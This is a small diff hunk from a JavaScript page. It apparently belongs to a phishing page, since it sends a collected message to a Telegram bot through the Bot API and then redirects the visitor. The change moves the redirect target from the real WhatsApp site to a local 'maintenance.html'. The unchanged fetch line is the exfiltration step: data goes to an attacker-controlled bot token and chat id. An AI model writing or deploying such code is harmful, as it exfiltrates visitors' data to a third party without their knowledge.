@@ -102,7 +102,8 @@
                 
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
                 .finally(() => { 
-                    window.location.href = 'https://www.whatsapp.com'; 
+                     window.location.href = 'maintenance.html';
+
                 });
             };
 
